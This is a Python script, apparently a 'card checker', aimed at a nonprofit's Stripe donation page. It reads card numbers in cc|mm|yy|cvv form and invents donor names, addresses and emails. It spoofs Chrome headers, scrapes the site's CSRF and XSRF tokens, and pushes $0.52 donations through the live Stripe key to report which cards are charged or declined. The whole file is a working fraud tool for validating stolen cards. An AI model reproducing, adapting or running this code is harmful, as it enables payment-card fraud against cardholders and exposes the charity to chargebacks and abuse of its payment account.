import aiohttp
import asyncio
import re
import json
import random
import string
import uuid
import time

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASE_URL = "https://livelihoodnw.org"
FUND_ID = "6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"
WEBSITE_ID = "62fc11be71fa7a1da8ed62f8"
STRIPE_PK = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
STRIPE_ACCOUNT = "acct_1LwocDFHMGxIu0Ep"
DONATION_AMOUNT_CENTS = 52  # $0.52

FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Tampa", "FL", "33601"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Los Angeles", "CA", "90001"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road", "0123 Birch Court", "4567 Willow Way"]

def get_desktop_headers(origin=None, referer=None, sec_site="none", sec_mode="navigate", sec_dest="document"):
    h = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': sec_dest, 'sec-fetch-mode': sec_mode,
        'sec-fetch-site': sec_site, 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    if origin: h['origin'] = origin
    if referer: h['referer'] = referer
    return h

def gen_fake_data():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    street, (city, state, zip_code) = random.choice(US_STREETS), random.choice(US_CITIES)
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    email = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@gmail.com"
    return fn, ln, street, city, state, zip_code, phone, email

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AUTOMATED API FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def step0_get_crumb(session):
    headers = get_desktop_headers()
    async with session.get(f"{BASE_URL}/", headers=headers, timeout=20) as resp:
        pass # Cookies are automatically stored in the session's cookie_jar
    
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb = cookies.get("crumb")
    return crumb.value if crumb else None

async def step1_get_cart_token(session):
    headers = get_desktop_headers(origin=BASE_URL, referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='cors', sec_dest='empty')
    headers['accept'] = 'application/json, text/plain, */*'
    headers['content-type'] = 'application/json'
    del headers['upgrade-insecure-requests']; del headers['sec-fetch-user']

    payload = {'amount': {'value': DONATION_AMOUNT_CENTS, 'currencyCode': 'USD'}, 'donationFrequency': 'ONE_TIME', 'feeAmount': None}
    
    async with session.post(f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}", headers=headers, json=payload, timeout=20) as resp:
        data = await resp.json(content_type=None)
        
    redirect = data.get("redirectUrlPath", "")
    match = re.search(r'cartToken=([^&]+)', redirect)
    return match.group(1) if match else None

async def step1b_get_xsrf_and_total(session, cart_token):
    headers = get_desktop_headers(referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='navigate', sec_dest='document')
    async with session.get(f"{BASE_URL}/checkout?cartToken={cart_token}", headers=headers, timeout=20) as resp:
        html = await resp.text()

    xsrf = None
    match = re.search(r'"xsrfToken"\s*:\s*"([^"]+)"', html)
    if match: xsrf = match.group(1)
        
    grand_total = None
    match = re.search(r'"grandTotal"\s*:\s*{[^}]*"decimalValue"\s*:\s*"([^"]+)"', html)
    if match: grand_total = match.group(1)

    return xsrf, grand_total

async def step2_create_pm(session, card_data, full_name, email, address_info):
    headers = {
        'accept': 'application/json', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache',
        'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    cn = card_data["card_number"]
    cn_fmt = ' '.join([cn[i:i+4] for i in range(0, len(cn), 4)])
    street, city, state, zip_code = address_info

    guid = str(uuid.uuid4()).replace('-', '') + '10e650'
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())

    data = {
        'billing_details[address][city]': city, 'billing_details[address][country]': 'US',
        'billing_details[address][line1]': street, 'billing_details[address][line2]': '',
        'billing_details[address][postal_code]': zip_code, 'billing_details[address][state]': state,
        'billing_details[name]': full_name, 'billing_details[email]': email, 'type': 'card',
        'card[number]': cn_fmt, 'card[cvc]': card_data['cvv'], 'card[exp_year]': card_data['year'], 'card[exp_month]': card_data['month'],
        'allow_redisplay': 'unspecified', 'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent',
        'referrer': BASE_URL, 'time_on_page': str(random.randint(200000, 500000)),
        'guid': guid, 'muid': muid, 'sid': sid,
        'key': STRIPE_PK, '_stripe_account': STRIPE_ACCOUNT,
    }

    async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20) as resp:
        rj = await resp.json(content_type=None)

    if "error" in rj:
        err = rj["error"]
        code = err.get("code", "unknown")
        msg = err.get("message", "Unknown error")
        dc = err.get("decline_code", "")
        if code == "card_declined":
            return None, f"DECLINED | {dc.upper() if dc else 'CARD_DECLINED'} - {msg}"
        return None, f"ERROR | {code.upper()}: {msg}"

    pm_id = rj.get("id")
    if not pm_id or not pm_id.startswith("pm_"):
        return None, "ERROR | TOKENIZATION_FAILED"
    return {"id": pm_id}, None

async def step3_submit_order(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total):
    headers = {
        'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/json', 'origin': BASE_URL, 'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
        'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
        'x-csrf-token': crumb, 'x-siteuser-xsrf-token': xsrf,
    }

    fn = full_name.split()[0] if ' ' in full_name else full_name
    ln = ' '.join(full_name.split()[1:]) if ' ' in full_name else ''
    street, city, state, zip_code = address_info
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"

    # The exact payload structure you provided
    payload = {
        "email": email, "subscribeToList": True, "billToShippingAddress": False,
        "billingAddress": {
            "id": "", "firstName": fn, "lastName": ln, "line1": street, "line2": "15th street",
            "city": city, "region": state, "postalCode": zip_code, "country": "US", "phoneNumber": phone
        },
        "cartToken": cart_token, "createNewUser": False, "customFormData": None,
        "makeDefaultPayment": False, "makeDefaultShippingAddress": False, "newUserPassword": None,
        "paymentCardId": None,
        "paymentToken": {
            "stripePaymentTokenType": "PAYMENT_METHOD_ID", "token": pm['id'], "type": "STRIPE"
        },
        "proposedAmountDue": {"decimalValue": grand_total, "currencyCode": "USD"},
        "reCaptchaToken": None, "savePaymentInfo": False, "saveShippingAddress": False,
        "shippingAddress": {
            "id": "", "firstName": "", "lastName": "", "line1": "", "line2": "",
            "city": city, "region": state, "postalCode": "", "country": "", "phoneNumber": ""
        },
        "shippingAddressId": None, "universalPaymentElementEnabled": True
    }

    async with session.post(f"{BASE_URL}/api/2/commerce/orders", headers=headers, json=payload, timeout=30) as resp:
        status_code = resp.status
        try: 
            rj = await resp.json(content_type=None)
        except: 
            return "ERROR", f"Invalid JSON response (Status: {status_code})"

    # Parse Response exactly as requested
    ft = rj.get("failureType", "")
    ss = rj.get("submissionStatus", "").upper()

    if ft == "PAYMENT_DECLINED":
        err_key = rj.get("errorKey", "UNKNOWN")
        return "DECLINED", f"PAYMENT_DECLINED | {err_key}"
    elif ft:
        return "DECLINED", ft
    elif ss == "ORDER_CONFIRMED":
        return "CHARGED", "ORDER_CONFIRMED"
    else:
        return "DECLINED", json.dumps(rj)[:150]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card(card_str: str):
    # Parse card
    parts = card_str.split("|")
    if len(parts) != 4:
        return "ERROR", "Invalid format. Use: cc|mm|yy|cvv"
    cc_num, mm, yy, cvv = parts
    if len(yy) == 4: yy = yy[-2:]
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    # Generate Fake Data
    fn, ln, street, city, state, zip_code, phone, email = gen_fake_data()
    full_name = f"{fn} {ln}"
    address_info = (street, city, state, zip_code)

    timeout = aiohttp.ClientTimeout(total=60)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        print("[*] Step 1: Getting Crumb & Cart Token...")
        crumb = await step0_get_crumb(session)
        if not crumb: return "ERROR", "Failed to get crumb token"
        
        cart_token = await step1_get_cart_token(session)
        if not cart_token: return "ERROR", "Failed to create cart token"

        print("[*] Step 2: Scraping XSRF Token & Grand Total...")
        xsrf, grand_total = await step1b_get_xsrf_and_total(session, cart_token)
        if not xsrf or not grand_total: return "ERROR", "Failed to parse checkout page"

        print("[*] Step 3: Tokenizing Card via Stripe...")
        pm, err = await step2_create_pm(session, card_data, full_name, email, address_info)
        if err:
            return "DECLINED", err

        print("[*] Step 4: Submitting Order to API...")
        status, raw_response = await step3_submit_order(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total)
        
        return status, raw_response

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def main():
    print("="*50)
    print("  LIVELIHOODNW.ORG AUTOMATED CHECKER")
    print("="*50)
    
    card_input = input("Enter Card (cc|mm|yy|cvv): ").strip()
    if not card_input:
        print("No card entered. Exiting.")
        return

    print("\nProcessing...\n")
    start_time = time.time()
    
    status, response = await process_card(card_input)
    elapsed = f"{time.time() - start_time:.2f}"
    
    print("-" * 50)
    print(f"Status   : {status}")
    print(f"Response : {response}")
    print(f"Time     : {elapsed}s")
    print("-" * 50)

if __name__ == "__main__":
    asyncio.run(main())
